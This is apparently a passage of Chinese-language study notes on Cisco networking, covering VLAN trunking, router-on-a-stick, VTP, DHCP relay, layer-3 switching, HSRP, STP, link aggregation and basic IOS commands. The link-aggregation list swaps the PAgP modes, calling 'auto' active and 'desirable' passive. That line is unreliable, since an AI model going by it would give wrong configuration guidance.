<p>​				注意：<strong>交换机最开始默认就有5个vlan：vlan1、vlan1002-1005</strong>；<strong>第一个是所有交换机端口的默认vlan,后面四个基本淘汰了</strong></p>
<h6 id="–Trunk：多个交换机连接同一局域网并设置vlan出现的问题"><a href="#–Trunk：多个交换机连接同一局域网并设置vlan出现的问题" class="headerlink" title="–Trunk：多个交换机连接同一局域网并设置vlan出现的问题"></a>–Trunk：多个交换机连接同一局域网并设置vlan出现的问题</h6><p><img src="/staticImg/image-20240429192708692.png" alt="image-20240429192708692"></p>
<p>​	从上图中可以看出，f0&#x2F;10以及f0&#x2F;9端口都没有配置vlan，因此在这个局域网内，即使第1台PC和第4台PC处于同一vlan，但是当PC1去<code>ping</code>PC4的时候，由于f0&#x2F;10没有配置vlan，导致数据能从f0&#x2F;1进入，但准备从f0&#x2F;10出去的时候，交换机发现f0&#x2F;10端口的vlan并不处于vlan10，因此数据无法出去。</p>
<p>解决方式：<strong>Trunk（中继端口）</strong><br>        中继端口也称为公共端口，它并不属于任何vlan，但<strong>允许任何vlan从该端口通过。</strong></p>
<p>​		此时又出现一个问题：从trunk端口出来的数据怎么判断该数据处于哪个vlan?<br>​			通过协议完成vlan识别：在进入trunk端口后，帧会被拆成两部分，并在<strong>中间插入一个标签</strong>（用于识别该帧属于哪个端口），在出trunk端口时，会将该标签拆除，恢复成原始帧，并通过拆下的<strong>标签识别该帧属于哪个vlan</strong>.</p>
<p>trunk标签：<br>        （1）ISL标签：cisco私有的，标签大小30字节（26+4），在帧两端加入（不拆开帧）<br>        （2）802.1q标签：公有协议，所有厂家都支持，标签大小4字节。属于内部标签（拆开帧，在帧中间插入）</p>
<h6 id="–配置trunk命令："><a href="#–配置trunk命令：" class="headerlink" title="–配置trunk命令："></a>–配置trunk命令：</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">1. switchport trunk encapsulation dot1q/isl	#进入需要配置成trunk的端口，然后使用该命令将该端口设置为trunk,最后一个参数代表trunk标签的类型，二选一即可（需要交换机支持）,这条命令是可选的，用于选择标签的类型，若是交换机不支持该命令，说明交换机只支持802.1q标签，此时直接使用下一条命令即可<br>2. switchport mode trunk	#在完成上面的命令后，紧接着使用这条命令，将该端口的模式设置为trunk，后期若是不需要将该端口作为trunk端口，而是要连PC,则需要在该端口再次使用该命令，只不过需要将最后的参数替换为 access<br></code></pre></td></tr></table></figure>

<h6 id="–交换机端口链路类型"><a href="#–交换机端口链路类型" class="headerlink" title="–交换机端口链路类型"></a>–交换机端口链路类型</h6><p>​		（1）接入端口：也称为<strong>access端口</strong>，一般用于连接PC，<strong>只能属于某一个Vlan，也只能传输1个Vlan的数据</strong><br>​		（2）中继端口：也称为<strong>trunk端口</strong>，一般用于连接其它交换机，<strong>属于公共端口，允许所有的vlan的数据通过</strong></p>
<h6 id="–Vlan总结"><a href="#–Vlan总结" class="headerlink" title="–Vlan总结"></a>–Vlan总结</h6><p>​	Vlan是二层技术，但是路由器配置不了Vlan表</p>
<h5 id="（4）单臂路由"><a href="#（4）单臂路由" class="headerlink" title="（4）单臂路由"></a>（4）单臂路由</h5><p>​		之前的vlan技术是用于控制广播域；不同的vlan之间无法通信，因此最好设置成1个vlan对应一个网段；</p>
<h6 id="–实现不同Vlan之间的通信（通过路由实现）"><a href="#–实现不同Vlan之间的通信（通过路由实现）" class="headerlink" title="–实现不同Vlan之间的通信（通过路由实现）"></a>–实现不同Vlan之间的通信（通过路由实现）</h6><p>​				1）<strong>配置子接口（f0&#x2F;0.1 、f0&#x2F;0.2），每个子接口都是一个网段的网关;</strong><br>​				2）<strong>并且给子接口配置识别trunk标签的功能，因为F0&#x2F;3需要配置成trunk端口，而路由器是无法配置trunk端口，但是路由器能识别trunk标签。配置识别标签的命令为：<code>encapsulation dot1q 10（图片中是错误的）	#最后一个参数代表识别的标签</code>；配置了之后则该子接口只能识别vlan为10的帧，即只让vlan为10的数据通过</strong></p>
<p><img src="/staticImg/image-20240430141730851.png" alt="image-20240430141730851"></p>
<h6 id="–单臂路由总结"><a href="#–单臂路由总结" class="headerlink" title="–单臂路由总结"></a>–单臂路由总结</h6><p>​		1.<strong>由于路由器只接了一根线实现了俩个子接口，所以称为单臂（已被淘汰）；</strong><br>​		2.也可以直接接两根线，并将两根线设置不同vlan，也能实现同样的效果（耗费资源）；<br>​		3.不同vlan之间的通信是靠路由来实现的</p>
<p>​		<strong>缺点：</strong><br>​			1）只靠一根线进行通信，容易出现瓶颈<br>​			2）容易发生单点物理故障（所有的子接口依赖同一个总物理接口）<br>​			3）vlan间通信的每一个帧都进行单独路由</p>
<h6 id="–交换机配置VTP"><a href="#–交换机配置VTP" class="headerlink" title="–交换机配置VTP"></a>–交换机配置VTP</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">1.vtp服务器的设置，裁剪功能默认开启</span><br>1. vtp mode server  #在全局配置模式下，使用该命令将该交换机的设置成vtp的服务器<br>2. vtp domain xin	#使用上面的命令之后，设置域名名称<br>3. vtp password 123.com	#使用上一条命令之后，设置该交换机的密码<br>&#x27;&#x27;&#x27;以上三条命令用于将某台交换机设置成vtp 服务器，并设置域名和密码&#x27;&#x27;&#x27;<br>4. show vtp status	#查看vtp的配置<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">2.vtp 客户端的设置</span><br>1. vtp mode client	#在全局配置模式下，使用该命令将交换机设置为vtp客户端<br>2. vtp domain xin #使用上条命名后，设置域名<br>3. vtp password 123.com  #设置密码<br></code></pre></td></tr></table></figure>



<h6 id="–配置DHCP服务的方式"><a href="#–配置DHCP服务的方式" class="headerlink" title="–配置DHCP服务的方式"></a>–配置DHCP服务的方式</h6><p>1）在三层路由器上配置dhcp</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">1. ip dhcp excluded-address 10.1.1.1 10.1.1.99	#在创建地址池的时候，先把一些地址排除，此处将10.1.1.0网段的1-99号地址都排除了，其它人获取不到，该命令可以执行多次，用于排除多个地址<br>2. ip dhcp pool v10		#在全局配置模式下，使用该命令创建地址池，名称为v10<br>3. network 10.1.1.0 255.255.255.0		#接着配置分发的ip网段<br>4. default-router 10.1.1.254	#配置网关<br>5. dns-server 40.1.1.1		#配置dns<br>6. lease 2 2 2		#最后配置租约，最后三个参数的为租约时间，此处代表 2天 2小时 2分钟<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除路由器的DHCP服务,以下俩条命令一起使用，则对应的dhcp服务就被删除了</span><br>7. no ip dhcp excluded-address 10.1.1.1 10.1.1.99<br>8. no ip dhcp pool v10	<br></code></pre></td></tr></table></figure>

<p>2）在服务器上配置dhcp–dhcp中继技术</p>
<p>​       当局域网通过vlan划分了不同的网段，而服务器处于某一个网段，此时，其它网段的PC获取ip的discover广播包到不了服务器，因此获取不到ip地址，因为广播最终只能到达同一广播域中的设备以及路由器。此时需要对路由器的端口做一些配置。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">在路由器端口上配置dhcp广播单播转发</span><br>1. ip helper-address 40.1.1.1	#进入某一个子接口，该命令将该子接口的dhcp广播单播转发到40.1.1.1,最后一个参数为单播转发地址<br></code></pre></td></tr></table></figure>



<h6 id="–实验"><a href="#–实验" class="headerlink" title="–实验"></a>–实验</h6><p>1.全网互通</p>
<p><img src="/staticImg/image-20240430153716916.png" alt="image-20240430153716916"></p>
<p>2.实验二</p>
<p><img src="/staticImg/image-20240505124125853.png" alt="image-20240505124125853"></p>
<p>要求：在上图的基础上，再加上50和60网段，依旧是全网互通</p>
<p><img src="/staticImg/image-20240505142611200.png" alt="image-20240505142611200"></p>
<h5 id="（5）ICMP协议"><a href="#（5）ICMP协议" class="headerlink" title="（5）ICMP协议"></a>（5）ICMP协议</h5><p>​	作用：网络探测与回馈机制<br>​		1）网络探测<br>​		2）路由跟踪<br>​		3）错误反馈</p>
<h6 id="–ICMP协议的封装格式"><a href="#–ICMP协议的封装格式" class="headerlink" title="–ICMP协议的封装格式"></a>–ICMP协议的封装格式</h6><p><img src="/staticImg/image-20240505134218933.png" alt="image-20240505134218933"></p>
<p>​	1）ICMP头：ICMP类型、代码</p>
<p>​		一般来说ICMP类型和代码字段是一样的，但是当ICMP为3，目标主机不可达时，后面的代码代表不可达的原因，此时代码与ICMP类型不一致</p>
<p>​		（1）ICMP类型字段<br>​					8：代表<code>ping</code>请求<br>​					0：代表<code>ping</code>应答<br>​					3：代表目标主机不可达<br>​					11：TTL超时</p>
<h5 id="（6）三层交换机（替代单臂路由）：也叫核心交换机"><a href="#（6）三层交换机（替代单臂路由）：也叫核心交换机" class="headerlink" title="（6）三层交换机（替代单臂路由）：也叫核心交换机"></a>（6）三层交换机（替代单臂路由）：也叫核心交换机</h5><p><img src="/staticImg/image-20240505170015143.png" alt="image-20240505170015143"></p>
<h6 id="–三层交换机的组成"><a href="#–三层交换机的组成" class="headerlink" title="–三层交换机的组成"></a>–三层交换机的组成</h6><p>​	三层交换机 &#x3D; 三层路由 + 二层交换机<br>​	其中三层路由引擎是可以关闭（no ip routing）或开启的 </p>
<h6 id="–三层交换机的优点（与单臂路由相比）"><a href="#–三层交换机的优点（与单臂路由相比）" class="headerlink" title="–三层交换机的优点（与单臂路由相比）"></a>–三层交换机的优点（与单臂路由相比）</h6><p>​	1）解决了网络瓶颈问题<br>​	2）解决了单点故障（虚拟接口不再依赖任何物理接口）<br>​	3）解决了需要对发送的每个帧都进行单独路由：<strong>一次路由，永久转发</strong><br>​			解释：当需要跨网段通信时，此时若需要发送大量帧，则只有第一个帧需要经过繁琐的变换MAC地址的过程，后面的帧则不需要；因为一旦第一个帧经过繁琐的过程后，三层交换机会形成俩个表 <code>CEF表</code> 和 <code>邻接关系表</code>，两张表的记录一一对应；后续发送的帧，三层交换机会检查其中的<strong>目标ip地址</strong>并与<strong>CEF表中进行匹配</strong>，匹配成功则直接<strong>将帧头用邻接关系表中对应的MAC地址替换</strong>。<br><img src="/staticImg/image-20240505172718556.png" alt="image-20240505172718556"></p>
<h6 id="–开启三层路由功能：三层交换机上起虚接口（配置vlan的网关）"><a href="#–开启三层路由功能：三层交换机上起虚接口（配置vlan的网关）" class="headerlink" title="–开启三层路由功能：三层交换机上起虚接口（配置vlan的网关）"></a>–开启三层路由功能：三层交换机上起虚接口（配置vlan的网关）</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">1. ip routing  #在全局配置模式下，使用该命令开启三层路由功能（三层路由引擎）<br>2. int vlan 10 <br>	ip add 10.1.1.254<br>	no shut		#以上三条命令，用于开启虚拟端口，使得交换机与路由器之间形成一条虚拟的线<br></code></pre></td></tr></table></figure>

<h6 id="–将三层路由器的端口升级为路由端口"><a href="#–将三层路由器的端口升级为路由端口" class="headerlink" title="–将三层路由器的端口升级为路由端口"></a>–将三层路由器的端口升级为路由端口</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">1. int f0/x<br>	no switchport  #将该端口升级为路由端口<br></code></pre></td></tr></table></figure>

<h6 id="–实验-1"><a href="#–实验-1" class="headerlink" title="–实验"></a>–实验</h6><p><img src="/staticImg/image-20240505183859815.png" alt="image-20240505183859815"></p>
<h5 id="（7）HSRP协议-VRRP协议：热备份路由协议"><a href="#（7）HSRP协议-VRRP协议：热备份路由协议" class="headerlink" title="（7）HSRP协议&#x2F;VRRP协议：热备份路由协议"></a>（7）HSRP协议&#x2F;VRRP协议：热备份路由协议</h5><p>​	当一个网络中有俩个网关（俩路由器）时，需要将其中一个网关用于备份，这样当主网关故障时，备用网关能继续起作用；<br>​	<strong>其中HSRP协议是思科私有的，而VRRP协议是公有的，但俩者原理差不多</strong></p>
<h6 id="–配置步骤："><a href="#–配置步骤：" class="headerlink" title="–配置步骤："></a>–配置步骤：</h6><p>​		1.在对应端口上开启HSRP协议，并加入到同一个HSRP组中（组号相同即可，组号范围：1-255，组号没有大小之分，先后之分）<br>​		2.一旦俩个端口加入到同一组之后，此时该组会出现一个<strong>虚拟的路由器（同时具备一个虚拟IP）</strong>，此时该组有三个网关，对应三个ip<br>​				HSRP组：<br>​					（1）成员：虚拟路由器（老大）；活跃路由器（老二）；备份路由器（老三）；若还有，则统称为：其它路由器<br>​					（2）HSRP优先级：1-255：数字越高越容易被选举为活跃路由器，越低越容易被选举为备份路由器；<strong>默认：100</strong><br>​					（3）组内成员之间的通信：组内成员定时发送hello包来交流，<strong>默认每隔3秒</strong><br>​					注意：<strong>用户的网关指向虚拟路由器</strong>，但是用户的流量是通过活跃路由器走的</p>
<p>​				当活跃路由器宕机之后：备份路由会每隔3秒向活跃路由发送hello包，若<strong>10秒</strong>没有收到回复，那么备份路由会向虚拟路由发送一个hello包，此时<strong>备份路由取代活跃路由</strong>；若是此时原													活跃路由正常重新启动，那么此时的升级为活跃路由的备份路由会<strong>自动让位</strong></p>
<p>​					（4）占先权：一般给备份和其它路由配置；若是备份路由器配置了该权限，<strong>一旦向活跃路由发送的hello包没有回复或对方优先级比自己低</strong>，则备份路由直接升级为活跃路由,							<strong>不会等待10秒</strong><br>​					（5）配置跟踪track，跟踪外网端口状态，一旦外网端口down掉，则自降优先级</p>
<h6 id="–配置命令"><a href="#–配置命令" class="headerlink" title="–配置命令"></a>–配置命令</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">配置组号</span><br>1. standby 组号 ip 192.168.1.254		#进入某个端口，使用该命令将端口加入热备份组，同时指定虚拟IP<br>2. standby 组号 priority 200			#进入某个端口，使用该命令设置端口优先级<br>3. standby 组号 preempt					#配置占先权<br>4. standby 组号 track f0/1			#配置跟踪track<br>5. show standby brief				#查看配置<br></code></pre></td></tr></table></figure>

<h6 id="–STP协议"><a href="#–STP协议" class="headerlink" title="–STP协议"></a>–STP协议</h6><p>​		生成树协议：防止二层设备之间的物理环路造成广播风暴；具体的解决方式是二层设备之间进行通信，最后将某个端口逻辑down掉，以免形成回路</p>
<h6 id="–PVST协议（思科私有的协议）"><a href="#–PVST协议（思科私有的协议）" class="headerlink" title="–PVST协议（思科私有的协议）"></a>–PVST协议（思科私有的协议）</h6><p>​		每个vlan生成树协议：二层设备间通信并分析每个vlan间是否有物理回路，并基于vlan来down掉某个端口（也就是说某个vlan可能无法通过，但是其它的vlan依旧可以通过）</p>
<p>​		<strong>注意：该协议是思科私有的，公有的协议是MST（多生成树协议）</strong>，且该协议一般与HSRP共同使用</p>
<h6 id="–实验-2"><a href="#–实验-2" class="headerlink" title="–实验"></a>–实验</h6><p>实验一</p>
<p><img src="/staticImg/image-20240512103753383.png" alt="image-20240512103753383"></p>
<p>实验二</p>
<p><img src="/staticImg/image-20240512113553972.png" alt="image-20240512113553972"></p>
<h5 id="8）补充：链路聚合（LACP协议）"><a href="#8）补充：链路聚合（LACP协议）" class="headerlink" title="8）补充：链路聚合（LACP协议）"></a><code>8）补充：链路聚合（LACP协议）</code></h5><ul>
<li><p>是一种实现链路动态汇聚的协议；采用LACPDU的协议报文来交互本端（Actor）和对端（Partner）的聚合信息，最终完成链路聚合。</p>
</li>
<li><p>在思科设备上有其私有的一种LACP协议：PAgP（与LACP协议有些不同）</p>
</li>
<li><p>标准的协议为：LACP（基于802.3）的LACP</p>
</li>
<li><p>链路聚合的模式：</p>
<ul>
<li>active：LACP的主动模式</li>
<li>passive：LACP的被动模式</li>
<li>auto：PAgP独有的主动模式</li>
<li>desirable：PAgP被动模式</li>
<li>on：以太网通道</li>
</ul>
</li>
<li><p>LACP的配置：</p>
<ul>
<li><p>首先进入需要汇聚的端口（必须是<code>trunk</code>端口），接着使用下面的命令，指定协议：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">channel-protocol lacp<br></code></pre></td></tr></table></figure>
</li>
<li><p>接着指定聚合模式（也是在端口下使用）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">channel-group 1 mode active		&#x27;&#x27;&#x27;参数 1 表示组号，active 表示设置为 主动模式<br></code></pre></td></tr></table></figure>
</li>
<li><p>将聚合通道配置为trunk</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">int port-channel 1				&#x27;&#x27;&#x27;进入组号 1<br>	sw mode trunk<br></code></pre></td></tr></table></figure>
</li>
<li><p>一些其它命令：查看命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">show int f0/1 sw   &#x27;&#x27;&#x27;查看的当前端口的状态<br>show spanning-tree		&#x27;&#x27;&#x27;查看生成树，也可以查看端口是否up<br></code></pre></td></tr></table></figure>
</li>
<li><p>配置成以太网通道：另一种汇聚方式，<code>但是有限制（只能汇聚8条）</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">进入端口，直接设置模式为 on, 不用先指定协议</span><br>channel-group 1 mode on<br><span class="hljs-meta prompt_">#</span><span class="language-bash">若要设置成trunk,可以直接进入group1端口</span><br>int port-channel 1<br>	sw mode trunk			&#x27;&#x27;&#x27;在group 1 中设置trunk ，则其中涉及的所有端口都将被设置为trunk <br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="4）数据链路层："><a href="#4）数据链路层：" class="headerlink" title="4）数据链路层："></a>4）数据链路层：</h4><p>​				加上<code>MAC子层</code>和<code>FCS</code>，<code>MAC子层</code>里面包含源mac地址和目标mac地址，这俩个MAC地址主要给交换机看的；<br>​				<code>FCS</code>固定长度4个字节，其作用与Hash算法一样，校验数据完整性，只不过这里使用循环校验算法<strong>CRC算法</strong>；<br>​				交换机工作在数据链路层；<br>​				输出的数据称为<strong>数据帧</strong>(frame)，MAC子层也称为帧头，FCS也称为帧尾<br>​				代表设备：交换机，网卡；<strong>网卡负责生成帧，发送给交换机</strong><br>​				协议：MAC子层协议，（<strong>数据从网络层流向数据链路层时，必须经过MAC子层协议来封装帧头和帧尾</strong>）</p>
<h5 id="帧结构："><a href="#帧结构：" class="headerlink" title="帧结构："></a>帧结构：</h5><p>​					帧协议：有线网卡：802.3； 无线网卡：802.11<br>​					帧头：目标MAC，源MAC地址，类型；其中单个MAC地址占48bit（<strong>6字节</strong>），类型占16bit（<strong>2字节</strong>）<br>​								其中类型只有两个值：<strong>0x0800（IP协议）和0x0806（ARP协议）；</strong><br>​								类型的作用在于：识别上层协议，为上层提供服务<br>​					帧尾：占<strong>4字节</strong><br>​					MTU（最大传输单元）：<strong>1500字节</strong>（国内）<br>​					因此，整个帧的最大长度为：<strong>6+6+2+1500+4&#x3D;1518字节</strong><br>​					帧结构图如下：</p>
<p><img src="/staticImg/image-20240419160321377.png" alt="image-20240419160321377"></p>
<h5 id="交换机工作原理："><a href="#交换机工作原理：" class="headerlink" title="交换机工作原理："></a>交换机工作原理：</h5><p>​						交换机收到一个数据帧之后：<br>​							首先学习帧中的源MAC地址及对应端口，形成MAC地址表；<br>​							然后检查帧中的目标MAC地址，并在记录的MAC地址表中匹配：<br>​									（1）若表中有匹配项，则单播转发<br>​									（2）若表中无匹配项，则除接收端口外广播转发</p>
<p><img src="/staticImg/image-20240419175707995.png" alt="image-20240419175707995"></p>
<p>​						其它知识：<br>​										1）<strong>交换机通过帧中的源MAC地址学习MAC地址表</strong>；	<br>​										2）一旦某台主机拔掉网线，与其相连的交换机MAC地址表在<strong>300s（老化时间，可修改）</strong>之后就会删除该主机												 的MAC地址记录；<br>​										3）若是某台主机换了网线，则其相连的MAC地址表会<strong>立即更新</strong>，而该网线之前的主机MAC地址记录会在												 300s后自动删除；<br>​										4）E，F，G，Te 分别对应10Mb，100Mb，1000Mb，10000Mb传输速率<br>​										5）F0&#x2F;1：其中0表示模块号，1表示该模块的接口号<br>​										6）<strong>接口速率自适应</strong>：1000&#x2F;100&#x2F;10M自适应：表示其工作模式可以兼容三种速率且自适应切换；若自适应失败，										      则该网线的两端无法收发数据（处于down状态）<br>​										接口状态：up&#x2F;down<br>​											其中down有三种可能：<br>​												（1）人工down掉<br>​												（2）速率不匹配<br>​												（3）双工模式不匹配（双工duplex）</p>
<p>​										<strong>双工模式</strong>：单工、半双工、全双工<br>​												（1）单工：只能单向通信；比如bb机，收音机（基本不用）<br>​												（2）半双工：可以双向通信，但不能同时通信，同一时间内只能单向通信<br>​												（3）全双工：可以双向通信，且支持双方同时进行通信（普遍使用）</p>
<h5 id="交换机-路由器基本工作模式及命令：使用工具模拟（PT软件）"><a href="#交换机-路由器基本工作模式及命令：使用工具模拟（PT软件）" class="headerlink" title="交换机&#x2F;路由器基本工作模式及命令：使用工具模拟（PT软件）"></a>交换机&#x2F;路由器基本工作模式及命令：使用工具模拟（PT软件）</h5><p>​						第一次配置网络设备，需要使用<strong>console线</strong>；并在PC上使用软件“<strong>超级终端</strong>”或其它软件</p>
<h6 id="1）工作模式-5大模式"><a href="#1）工作模式-5大模式" class="headerlink" title="1）工作模式:5大模式"></a>1）工作模式:5大模式</h6><p>​							<code>switch &gt;</code>:<strong>用户模式</strong>： 可以查看交换机的基本简单信息，且不能对配置做任何修改<br>​							<code>switch #</code>:<strong>特权模式</strong>：用户模式下使用命令<code>enable</code>进入，该模式下可以查看所有配置，但不能修改配置，除了一些如测																试，保存，初始化等操作<br>​							<code>switch(config) #</code>:<strong>全局配置模式</strong>：在特权模式下，使用 <code>configure terminal</code>命令进入全局配置模式；该模式下默认不																					能查看配置，可以修改配置，且全局生效<br>​							<code>switch(config-if) #</code>:<strong>接口配置模式</strong>：在全局配置模式下，使用<code>interface f0/1</code>进行某个接口的配置（接口配置模																						 式）；该模式下，默认不能查看配置，可以修改配置，且只对该接口生效<br>​							<code>switch(config-line) #</code>:<strong>console口配置&#x2F;线&#x2F;控制模式</strong>：在全局配置模式下，使用<code>line console 0</code>进入console口配																													置模式，该模式下，默认不能查看配置，可以修改配置，且只对																													console接口生效</p>
<h6 id="2）交换机命令"><a href="#2）交换机命令" class="headerlink" title="2）交换机命令"></a>2）交换机命令</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">一、只要缩写的命令能被唯一识别，可以随意缩写命令，且tab键能补全命令</span><br>1. enable 简写 en   #一般通过console线进入都是用户模式，使用该命令进入特权模式<br>2. configure terminal 简写：conf t	#在特权模式下，通过该命令进入全局配置模式<br>3，interface f0/1 简写 int f0/1	#在全局配置模式下，使用该命令对某个端口进行配置，f0/1为具体端口号<br>4. exit		#退出当前模式，返回上一级模式<br>5. line console 0 简写 line co 0	#在全局配置模式下，使用该命令进入第一个console接口<br>6. end		#不管当前处于什么模式，使用该命令，直接退回到特权模式（不能在用户模式下使用）<br>7. e?		#显示以 e 开头的命令 <br>8. hostname sw1		#在全局配置模式下，修改当前设备名称<br>9. password xinxin		#切换到console口，使用该命令给交换机设置用户密码为 xinxin ，与下一条命令一起使用<br>10. login		#输完上调命令还不行，还需要再输入这条命令，俩条命令设置完成后，下次连接该交换机需要输入密码<br>11. reload		#特权模式下，使用该命令，重启交换机<br>14. show running-config/startup-config		#在特权模式下，使用该命令查看running-config/startup-config配置文件内容<br>15. enable password xinxin	#在全局配置模式下，使用该命令可以设置特权模式密码，该密码以明文保存在config中<br>16. enable secret xinxin	#在全局配置模式下，使用该命令可以设置特权模式密码，且该密码被加密，且当明文密码与加密密码同时配						   置，明文密码会失效<br>17. erase startup-config	#在特权模式下，使用该命令，删除stratup-config配置文件，意味着初始化配置<br>18. show mac-address-table	#在特权模式下，查看交换机中的MAC地址表<br>19. show ip interface		#在特权模式下，查看当前交换机上的端口列表<br>20. show ip interface brief		#和上调命令一样，只不过加上brief，简要查看；查看端口时，会出现俩个down，前面一个为物理状								态，后面一个为协商状态；若是物理状态为down说明没有PC连接，若是 administratively down则								是人为down,意味着该端口不可使用；协商状态主要由速率是否匹配，双工模式是否匹配<br>21. shutdown			#进入某个具体端口，使用该命令，人为down掉该端口<br>22. no shutdown			#进入某个人为down掉的端口，使用no命令，删除之前的shutdown命令<br>23. do show running-config 	#在全局配置模式下，默认是不能查看配置，但使用do可以强制查看，且能执行所有特权模式下的命令<br>24. no hostname fei		#在全局配置模式下，使用no 命令，删除之前的配置hostname fei；命令在哪配的在哪使用no 进行删除	<br>&#x27;&#x27;&#x27;no命令的使用：当命令后面的参数具有唯一性时（即只使用了一次 hostname fei）,那么config中只存在一条该命令，则使用no命令进行删除的时候可以不带 fei ,即直接使用命令 no hostname 即可&#x27;&#x27;&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">二、注意事项</span><br>	1)二层设备默认网线端口是可用的(down),三层设备默认人为关闭（administratively dowm）<br>	2)每次重新登陆交换机，都会在内存中自动创建一个新的干净的running-config文件，此时在该文件上进行的配置，在重启之后就会消失。若要持久化保存内存中running-config文件中的配置，需要在特权模式下，使用下面这条命令：<br>12.copy running-config startup-config    #将内存中的running-cofig文件拷贝到硬盘上的startup-config文件中<br>或者也能使用下面这条(但这条并不是所有的交换机都能使用，有的交换机不支持)：<br>13.write（思科独有，上面一条通用）<br>	这样的话，交换机开机之后：先去硬盘中查找startup-config 文件，看是否存在，若不存在，则在内存中创建新的干净的running-config文件，若存在的话，则将其复制到内存中并改名为running-config<br><span class="hljs-meta prompt_">	</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">三、快捷键</span><br>Ctrl + u  : 删除光标前面的所有内容<br>Ctrl + a  : 快速将光标移动到行首<br>Ctrl + e  : 快速将光标移动到行末<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">四、远程控制交换机</span><br>	由于交换机工作在二层，因此无法和路由器一样可以为端口设置ip用于远程管理，但是一般企业级的交换机内部会有一个虚拟接口，该接口连接了一台内置PC,虽然交换机无法配置ip，但是该PC可以配置ip,用于远程管理该交换机<br>25. int vlan 1	#在全局配置模式下，使用该命令进入虚拟接口1，之后就可以正常为该接口配置ip了<br>26. ip add 10.1.1.253 255.255.255.0	#进入虚拟接口后，使用该命令配置ip<br>27. no shutdown 	#最后记得手动开启该虚拟接口<br>	若是需要跨网段控制交换机，则需要再给交换机中的虚拟PC配置网关<br>28. ip default-gateway 20.1.1.254	#在全局配置模式下，使用该命令给交换机配置网关<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">五、解决命令敲错后一直处于询问状态</span><br>29. no ip domain-lookup	#在全局配置状态下，使用该命令关闭域名解析，后面敲错命令就不会一直卡着<br></code></pre></td></tr></table></figure>

